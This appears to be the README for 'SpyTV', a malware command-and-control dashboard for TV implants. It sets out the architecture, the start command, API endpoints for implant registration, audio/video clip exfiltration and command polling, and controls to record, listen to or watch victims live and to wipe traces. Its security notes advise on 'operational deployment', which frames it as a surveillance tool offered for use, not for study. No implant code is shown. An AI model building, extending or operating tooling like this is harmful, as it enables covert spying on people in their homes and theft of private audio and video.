# SpyTV C2 Dashboard

## Overview

The SpyTV C2 (Command & Control) server provides a web-based dashboard for managing TV implants. It handles audio/video exfiltration, device control, and command dispatch.

## Architecture

```
[TV Implant] <--HTTP--> [C2 Server :8443] <--HTTP/WebSocket--> [Web Dashboard]
```

- **C2 Server** (`c2_server.py`): Python HTTP server on port 8443
- **Dashboard** (`c2_dashboard.html`): Single-page JS app served by C2
- **Implant** (`tvreaper.js`): Polls C2 every 5 seconds for commands
- **Storage** (`c2_data/`): Clips, device registry, command queue

## Starting the C2

```bash
python c2_server.py
```

The dashboard is available at `http://localhost:8443/`

## API Endpoints

### Device Management
- `POST /api/register` — Implant registers with C2
- `GET /api/devices` — List all connected devices

### Clip Exfiltration
- `POST /api/exfil` — Upload audio/video clip (headers: `X-Device-ID`, `X-Clip-Kind`)
- `GET /api/clips` — List all clips
- `GET /api/clip/<id>` — Download a specific clip

### Command Dispatch
- `POST /api/command` — Send command to device
- `POST /api/poll` — Implant polls for pending commands

## Dashboard Features

### Device Grid (2x2)
Shows up to 4 connected devices with:
- IP address, family, entry method
- Online/offline status
- Video thumbnail grid (2x2, latest 4 frames)
- Audio player (latest clip)

### Per-Device Controls
| Button | Command | Description |
|--------|---------|-------------|
| Record Audio | `record_audio` | Record audio for 1-20 minutes |
| Record Video | `record_video` | Record video for 1-20 minutes |
| Listen | `listen` | Stream live audio for 60 seconds |
| Watch | `watch` | Stream live video for 60 seconds |
| Remove | `remove` | Wipe implant and all traces |
| Patch | `patch` | Disable capture, apply security patch |

### Duration Selection
Choose recording duration: 1, 2, 5, 10, 15, or 20 minutes.

### Activity Log
Shows timestamped command history with "Clear Logs" button.

## File Structure

```
c2_server.py          — C2 HTTP server
c2_dashboard.html     — Web dashboard (served at /)
logo.png              — C2 logo (served at /logo.png)
tvreaper.js           — Updated implant with C2 polling
c2_data/
  devices.json        — Device registry
  commands.json       — Command queue
  clips/
    audio/            — Audio clips (.wav)
    video/            — Video clips (.jpeg)
```

## Security Notes

- The C2 binds to `0.0.0.0:8443` by default. For operational use, restrict to localhost or use a reverse proxy with authentication.
- Clips are stored unencrypted on disk.
- No authentication on the dashboard — add auth before operational deployment.
- The implant polls over HTTPS in production (update `c2Base` in `CONFIG`).
